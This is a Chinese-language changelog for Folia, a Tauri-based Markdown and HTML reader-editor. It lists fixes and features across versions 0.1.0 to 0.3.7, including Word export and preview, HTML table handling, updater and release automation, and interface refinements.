- 修复 HTML table Markdown 默认稳定阅读时缺少页面内编辑入口的问题；普通 Markdown 默认进入即时渲染编辑器并可直接编辑。
- 关于页移除 Folia 标题下的能力说明和作者方向描述，减少关于页信息密度。
- 收紧即时渲染编辑器和稳定阅读预览的上下留白，改善大文档打开后的可视高度。
- 修复 Floating TOC 未固定时从横线轨道移向展开面板会因 hover 断层而消失、导致无法点击条目的问题；展开面板改为半透明，减少对正文的遮挡。
- 修复顶部栏透明拖拽覆盖层带来的交互命中不稳定风险；非按钮区域保留同步手动拖动 fallback，双击空白区域继续最大化。
- 调整 macOS overlay 红黄绿窗口控制的垂直位置，使其与 Folia 顶部栏图标视觉中线更一致。
- 精简主界面冗余线条：Word 预设区、分栏拖动区、编辑器 gutter 和预览边界改为更低权重表达。
- 打开或编辑文件后，文件名与 dirty 标记现在显示在标题栏视觉中心，不再跟随左侧文件按钮偏移。
- 关于页不再显示更新源，只保留项目地址、软件介绍和作者区域。
- 修复设置页第一次打开时只先显示变暗遮罩的问题：设置页会在空闲期预加载，懒加载等待时显示完整窗口骨架，并使用更连贯的进入动效。
- 修复 Word 纸张预览与导出 Word 在首行缩进、列表/引用/代码块缩进、行内代码、分割线、表格行高、表格单元格边距和图片宽度上的部分不一致。
- 修复自动检查更新在启动延迟期间被关闭再打开后，本会话不会重新排期检查的问题。
- 修复设置页 Word 导出预览放大时按 `Esc` 会直接关闭整个设置窗口的问题；现在优先关闭放大预览。
- 修复 Word 导出遇到单行 HTML table 时可能吞掉表格后续段落的问题；连续紧凑 HTML 表格现在会作为独立文档节点处理。
- 修复 Floating TOC 折叠状态下隐藏面板仍扩大透明命中区域的问题，避免遮挡正文点击和选区。
- 修复 Floating TOC 移除顶部按钮后的键盘可达性问题，折叠轨道现在可以通过键盘聚焦展开。
- 修复 Vditor WYSIWYG 异步挂载后 Floating TOC 当前标题高亮可能不随滚动更新的问题。
- 修复 HTML 表格导出 Word 时 `rowspan` 覆盖列被补成普通空单元格、导致合并单元格错列或列数膨胀的问题。
- 修复 HTML 表格导出 Word 时短行未补齐真实缺口、源码缩进空白生成额外空段落的问题。
- 修复 Word 纸张预览长表格分页时 `tfoot` 行丢失的问题。
- Word 导出 HTML 表格单元格时保留常见内部结构，包括段落、换行、加粗/斜体/下划线、行内代码、链接文本和简化列表。
- 修复 Markdown 管道表格解析：正确识别 `| --- | :---: | ---: |` 分隔行，并保留转义管道 `\|`。
- 修复 `npm run test:e2e` 在本机解析到上层旧版 Playwright CLI 的问题，项目现在显式固定 `playwright@1.60.0`。
- 同步前端、Rust 和文档中的版本/发布说明，减少 `0.1.0`、`0.0.0` 与 `0.3.7` 混用造成的排查干扰。

## [0.3.7] - 2026-05-19

### Added

- GitHub Actions 全平台自动发布工作流：tag 触发 → macOS ARM/Intel DMG + Windows EXE/MSI → 签名 → `latest.json` → GitHub Release。
- Release 发布后自动同步构建产物到 Gitee，生成 Gitee 专属 `latest.json` 供国内用户自动更新。

### Changed

- Updater 构建配置 `createUpdaterArtifacts` 改为 `true`，构建时生成签名产物。
- Updater endpoint URL 从 `{{target}}-{{arch}}.json` 改为统一的 `latest.json`。
- Bundle identifier 从 `com.folia.app` 改为 `com.folia.reader`，避免 macOS `.app` 扩展名冲突。
- Updater endpoints 增加 Gitee 备用源（国内优先），GitHub 作为 fallback。

### Fixed

- `.gitignore` 添加 `*.key` 排除规则，防止签名密钥意外提交。
- `docs/icon.png` 添加 macOS 标准圆角，GitHub 上显示更自然。

## [0.3.6] - 2026-05-18

### Added

- Word 预览改为多页 A4 纸张栈，显示 `第 1 页`、`第 2 页` 等页标，长文档不再是一张无限长纸。
- Word 预览面板内新增导出预设选择器，切换预设会同步影响预览和后续 `.docx` 导出。
- Settings / 导出支持导入自定义 JSON 预设，并提供 JSON 模板复制入口。

### Changed

- “导出 Word”按钮从顶部一级工具栏移入 Word 预览面板，只有打开 Word 预览时才显示。
- Word 预览拖拽调整宽度时只改变视觉缩放，不改变 A4 页面自身排版宽度。
- 导出预设从纯内置列表扩展为“内置预设 + 用户导入预设”的统一注册表。

## [0.3.5] - 2026-05-18

### Fixed

- 修复原生 HTML 表格文档在默认 WYSIWYG 区域中被压成极窄列、单元格接近逐字换行的问题。
- 修复大纲侧栏默认宽度和字号偏小的问题，提升长文档导航的可读性。
- 修复 macOS overlay 顶部栏部分区域只设置 `data-tauri-drag-region` 但拖动不稳定的问题，增加手动 `startDragging()` fallback；双击顶部栏空白区域会触发窗口最大化切换。
- 修复源码模式中 CodeMirror 容器随内容无限增高、导致长文档无法在窗口内滚动的问题。

### Changed

- 检测到原生 `<table>` 或打开 `.html` 文件时，主内容区自动使用 `Vditor.preview()` 稳定阅读预览；源码模式仍可编辑，普通 Markdown 仍默认进入 WYSIWYG。
- HTML 表格阅读预览使用更宽的内容版心，优先保证法律证据目录类宽表格可读。

## [0.3.4] - 2026-05-18

### Added

- 接入 Tauri updater / process 插件，新增启动后延迟自动检查更新、发现新版本提示、下载进度、安装后重启流程。
- Settings 新增“关于”页面，包含当前版本、自动检查更新开关、手动检查更新按钮和 GitHub Releases 更新源信息。
- 新增 `scripts/create-updater-manifest.mjs` 与 `npm run updater:manifest`，用于生成 GitHub Release 所需的 `darwin-aarch64.json` 更新清单。
- 新增 `npm run tauri:build:update`，用于在发布时生成签名 updater artifact。

### Changed

- 普通 `npm run tauri -- build` 默认不生成 updater artifact，避免本地打包因为缺少私钥失败；发布更新时使用专门脚本并提供签名私钥环境变量。

## [0.3.3] - 2026-05-18

### Changed

- 顶部工具栏图标更换为统一的文件流转语义：打开、保存、另存为、导出、源码、Word 预览、大纲和设置按钮更容易区分。
- 工具栏按钮尺寸、圆角和 hover 反馈微调，减少“标签感”，更接近克制的桌面工具栏。

## [0.3.2] - 2026-05-18

### Fixed

- 修复 macOS overlay 标题栏中工具栏空白区域无法稳定拖动窗口的问题。
- 修复拖拽 Markdown / HTML / Word 文件到窗口后无法稳定打开的问题，桌面端改用 Tauri 原生拖放事件读取文件路径。
- 修复 WYSIWYG 编辑区中央出现突兀白色画布的问题，默认写作背景统一为暖调纸面底色。
- 修复 Word 纸张预览把 A4 页面压缩成面板宽度导致版式不还原的问题，改为真实 A4 页面按比例缩放。

### Changed

- 顶部工具栏不再显示 Folia 名称，文件操作按钮改用更明确的打开、保存、另存为、导出 Word 图标。
- 默认窗口尺寸从 `1280×800` 调整为 `980×680`，更符合轻量阅读器的初始体量。
- Word 纸张预览继续复用 `md2word` 沉淀的 A4、页边距、标题、正文、表格、图片宽度规则，并保持按需加载。

## [0.3.1] - 2026-05-17

### Fixed

- 修复前端生产构建失败和 ESLint 失败，恢复 `npm run build` / `npm run lint` 可用。
- 修复 Tauri 打包后生成目录被 ESLint 扫描导致 `npm run lint` 误报失败的问题。
- 修复 Node 25 测试环境中全局 `localStorage` 干扰 jsdom，导致 Vitest 设置服务测试失败的问题。
- 修复 Settings 在切换二级菜单时因内容高度不同导致弹窗尺寸跳动的问题。
- 修复 Vditor 默认 `nowrap` 表格样式导致长证据目录横向撑出预览区的问题。
- 修复 macOS 原生标题栏显示为独立黑色条的问题，窗口标题栏改为 overlay 并融入 Folia 顶部工具区。
- 修复应用图标仅左上角透明、其余三个角仍为实色背景导致圆角不完整的问题。
- `.docx` 预览接入 DOMPurify 清洗，避免 Mammoth HTML 输出直接注入预览区。
- 修复旧版导出设置迁移的递归读取风险。
- Settings 中的自动保存、重新打开上次文件、默认编码、编辑器字体/拼写检查、预览字体/宽度等选项接入运行时行为。

### Changed

- 主界面默认改为 Vditor 所见即所得 Markdown 编辑器，占满内容区；源码编辑器改为工具栏按钮触发的 fallback。
- Word 纸张预览改为按需打开的右侧可拖拽面板，默认不占用主界面，也不在冷启动时加载。
- Word 纸张预览基于导出预设渲染 A4、页边距、字体、图片最大宽度和表格样式。
- 复杂原生 HTML 表格继续作为核心能力保护：阅读预览与 Word 纸张预览均覆盖 `rowspan` / `colspan` 渲染和长表格换行；源码模式保留为结构安全的编辑入口。
- 明确 v0.3 产品方向：默认 Typora-like 所见即所得编辑，右侧预览改为 Word 导出纸张预览，源码模式保留为复杂 HTML 表格 fallback。
- Toolbar 改为 lucide 图标按钮，并补充 Folia wordmark，整体更贴近 `docs/DESIGN.md` 的克制工具风格。
- Markdown / Word 预览统一使用设计系统变量，修正白底、蓝色链接等硬编码样式。
- Word 导出、docx 预览、Vditor 预览改为按需加载，降低首屏主包压力。
- 启动路径进一步瘦身：空文档不加载 Vditor JS/CSS，CodeMirror 编辑器、Tauri 文件服务、Settings 与 docx 预览均改为按需加载，上次文件恢复延迟到启动后的空闲时段。
- Vditor 预览增加内部内容特征探测：仅包含 Mermaid、数学公式、Graphviz 等由 Vditor 自渲染代码块时，不再加载普通代码高亮脚本；普通代码块仍保持高亮。
- 纯预览链路内联 Vditor 所需中文文案并关闭图标脚本加载，同时复用 Folia 自有预览样式，减少 `i18n`、`icons`、`content-theme` 运行时请求。
- 应用图标改为透明外角的圆角图标资产，修正 Dock / Finder 中显示为方形底色的问题。
- 工具栏按钮、图标和 Settings 信息层级整体放大，去掉选择框的原生渐变光泽。
- 主编辑区从“只看编辑 / 分屏 / 只看预览”改为默认 WYSIWYG 单页编辑；Word 预览作为右侧可拖拽面板按需打开。
- macOS 下为系统红黄绿窗口按钮预留顶部工具栏左侧空间，并设置应用窗口背景色与主界面奶油底一致。

### Added

- 新增 `WysiwygEditorPane`，使用现有 Vditor WYSIWYG 能力，不新增编辑器依赖。
- 新增 `WordPaperPreviewPane` 和 Word 预览样式映射服务。
- 新增 Word 纸张预览样式单元测试，以及 WYSIWYG / Word 预览 / HTML 表格相关 E2E 回归测试。
- 新增 Vitest 测试脚本与服务层测试，覆盖 HTML 清洗和设置持久化/迁移。
- 新增 Markdown 渲染特征探测测试，覆盖普通文档、普通代码块、Mermaid/数学公式等高级块的资源触发判断。
- 新增 Playwright 端到端回归测试，覆盖空文档冷启动、普通 Markdown、Mermaid-only、普通代码块的资源加载策略。
- 新增布局端到端回归测试，覆盖视图切换、分栏拖拽、Settings 固定尺寸和长 HTML 表格换行。
- 新增 `package-lock.json` 固定前端依赖版本。

### Removed

- 移除遗留 `markdown-it` / `@types/markdown-it` 依赖和不再使用的 `markdownService.ts`。
- 精简 `public/vditor/dist/`，移除运行时不引用的 TS/type 声明和未压缩 Vditor 构建文件，保留阅读功能所需的本地资源。

## [0.3.0] - 2026-05-16

### Added

- Word 导出支持嵌入本地图片（JPEG/PNG/GIF/BMP，Tauri readFile + docx ImageRun，自动缩放）
- Settings 页面：导出预设选择器（5 个预设单选列表），选择持久化到 localStorage
- 导出 Word 时使用用户选择的预设（替换原来硬编码的 legal 预设）
- Word 导出功能：Markdown → 格式化 .docx，支持 5 个预设（法律/学术/公文/法律服务方案/简约通用）
- Word 预览功能：打开 .docx 文件，mammoth 转 HTML 在预览区渲染
- 拖拽支持 .docx 文件
- `Cmd+Shift+E` 快捷键触发 Word 导出
- 应用图标：用户设计的字母 F 图标，全平台格式（.icns / .ico / PNG）
- 设计系统文档 `docs/DESIGN.md`
- 任务清单 `docs/TASKS.md`

### Changed

- README.md 技术栈更新为 Vditor + 补充图标
- Tauri capabilities 新增 `fs:allow-read-file` 和 `fs:allow-write-file` 二进制文件权限

## [0.2.0] - 2026-05-15

### Changed

- 渲染引擎从 markdown-it + DOMPurify 替换为 Vditor.preview()
- PreviewPane.tsx 改用 Vditor.preview() 渲染，支持 Mermaid 图表、KaTeX 数学公式、highlight.js 代码高亮
- CSS 选择器从 `.preview-document` 改为 `.preview-content`（Vditor 容器 class）
- CSP 收紧：移除 `https:` 通配，只允许本地资源 + `unsafe-eval`（Vditor 需要）

### Added

- Vditor 静态资源本地化到 `public/vditor/dist/`，不依赖外部 CDN
- 代码块语法高亮（highlight.js，github 主题）
- Mermaid 图表渲染支持
- KaTeX 数学公式渲染支持
- Vditor 内置 XSS 过滤（sanitize: true）

### Removed

- `src/services/markdownService.ts` 不再使用（Vditor 自带 Lute 引擎）
- `src/components/VditorTest.tsx` 测试组件已删除
- `dangerouslySetInnerHTML` 渲染方式已移除

## [0.1.0] - 2026-05-15

### Added

- Markdown + HTML 渲染（markdown-it + DOMPurify）
- 固定左右分屏：CodeMirror 6 编辑 + 实时预览
- TOC 大纲面板，点击跳转到对应标题
- 文件打开（对话框 Cmd+O + 拖拽）
- 保存 / 另存为（Cmd+S / Cmd+Shift+S）
- 法律文档表格样式（rowspan / colspan / thead / tbody）
- DOMPurify 安全清洗，禁止 script / 事件属性 / javascript: 链接
- Tauri v2 桌面应用，macOS 原生 WebView
